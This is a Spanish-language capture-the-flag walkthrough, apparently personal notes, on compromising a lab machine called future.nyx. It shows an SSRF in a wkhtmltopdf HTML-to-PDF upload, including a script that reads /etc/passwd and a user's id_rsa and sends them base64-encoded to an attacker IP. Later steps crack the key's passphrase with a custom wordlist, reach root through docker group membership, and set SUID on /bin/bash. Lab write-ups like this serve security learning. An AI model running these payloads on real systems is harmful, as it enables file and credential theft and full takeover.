Hacemos el escaneo con nmap:
![[Pasted image 20240329113006.png]]
En este escaneo vemos un dominio que lo añadiremos al archivo /hosts:
![[Pasted image 20240329113106.png]]
Y esto corre por el puerto 80:
![[Pasted image 20240329113137.png]]
Si hacemos un clic nos manda a otra url:
![[Pasted image 20240329113217.png]]
![[Pasted image 20240329113224.png]]
Hacemos fuzzing web tanto de directorios como de extensiones de archivos:
![[Pasted image 20240329113448.png]]
Dentro del directorio homework vemos un panel de subida de archivos, donde nos pide subir un archivo HTML que se convertirá en un archivo PDF:
![[Pasted image 20240329114147.png]]
Por lo que preparamos un HTML para subirlo:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Hola Mundo</title>
</head>
<body>
    <h1>Hola Mundo!</h1>
    <p>Este es un ejemplo de un "Hola Mundo" en HTML.</p>
</body>
</html>
```
![[Pasted image 20240329114612.png]]
Probamos en interceptar la petición con burp suite para ver cómo se comporta esta subida de archivo:
![[Pasted image 20240329114723.png]]
Llegados a este punto, podemos probar si se acontece un SSRF añadiendo en el HTML una imagen que lo que sea es una conexión a mi máquina atacante:
```HTML
<img src="http://192.168.0.20:443/probandoSSRF">
```
![[Pasted image 20240329115100.png]]
De esta forma, si estamos con netcat escuchando, recibimos la conexión, pero además podemos ver que la herramienta que se está ejecutando por detrás es wkhtmltopdf:
![[Pasted image 20240329115239.png]]
Comprobamos que se trata de una App que convierte HTML en PDF:
![[Pasted image 20240329115322.png]]
Lo que haremos será cargar un nuevo HTML con el siguiente contenido, que contendrá la etiqueta de script con el siguiente contenido y el enlace de gitbook donde se explica mejor:
https://j4ckie0x17.gitbook.io/notes-pentesting/pentesting-web/server-side-request-forgery-ssrf#blind-ssrf
```html
<!DOCTYPE html>
<html>
<head>
    <title>Hola Mundo</title>
</head>
<body>
    <h1>Hola Mundo!</h1>
    <p>Este es un ejemplo de un "Hola Mundo" en HTML.</p>
<script>

        var readfile = new XMLHttpRequest(); // Read the local file
        var exfil = new XMLHttpRequest(); // Send the file to our server

        readfile.open("GET","file:///etc/passwd", true);
        readfile.send();
        readfile.onload = function() {

            if (readfile.readyState === 4) {
                var url = 'http://192.168.0.20:443/?data='+btoa(this.response);
                exfil.open("GET", url, true);
                exfil.send();
            }
        }
        readfile.onerror = function(){document.write('<a>Oops!</a>');}

</script>
</body>
</html>
```
![[Pasted image 20240329120635.png]]
Y recibimos lo siguiente:
![[Pasted image 20240329120715.png]]
Esta data es el /etc/passwd, por lo que lo decodificamos en base64 y funciona:
![[Pasted image 20240329120806.png]]
Ahora vamos a probar en obtener el id_rsa del usuario mcfly:
![[Pasted image 20240329121107.png]]
Y recibimos la data siendo el id_rsa de este usuario
![[Pasted image 20240329121153.png]]
Lo decodificamos:
![[Pasted image 20240329121143.png]]
De todos modos se nos pide contraseña para usar este id_rsa:
![[Pasted image 20240329121312.png]]
Lo crackeamos con john the ripper, pero vemos que con el rockyou no funciona:
![[Pasted image 20240329121418.png]]
Pero en el código fuente del directorio /homework.html tenemos una pista diciendo que el cewler nos puede ayudar:
![[Pasted image 20240329121459.png]]
Tenemos el siguiente repositorio con la herramienta cewler para crear diccionarios:
https://github.com/roys/cewler
![[Pasted image 20240329121603.png]]
Y utilizamos esta herramienta pasándola por algunos de los directorios web para ir creando una wordlist:
```bash
cewl http://future.nyx/index.html -m 6 -w diccionario1.txt
cewl http://future.nyx/1955.html -m 6 -w diccionario2.txt
cewl http://future.nyx/2015.html -m 6 -w diccionario3.txt
cewl http://future.nyx/1885.html -m 6 -w diccionario4.txt
cewl http://future.nyx/homework.html -m 6 -w diccionario5.txt
cat diccionario* > wordlist
```
Y ahora tenemos una wordlist:
![[Pasted image 20240329152052.png]]
Y ahora con esta wordlist vemos que sí nos encuentra la contraseña:
![[Pasted image 20240329152126.png]]
Ya estamos dentro:
![[Pasted image 20240329152148.png]]
Si ejecutamos una búsqueda de binarios, nos encontramos con docker:
![[Pasted image 20240329152245.png]]
Vemos las siguientes isntrucciones de cómo escalar privilegios con docker en gtfobins:
![[Pasted image 20240329152325.png]]
Lo ejecutamos:
```bash
/usr/bin/docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
Y ya somos root, aunque estamos dentro del contenedor:
![[Pasted image 20240329152407.png]]
![[Pasted image 20240329152629.png]]
Si queremos pasar a root, simplemente podemos cambiarle el permiso a la bash y desde la máquina anfitrión ejecutar el comando bash -p:
```bash
chmod u+s /bin/bash
```
![[Pasted image 20240329152716.png]]
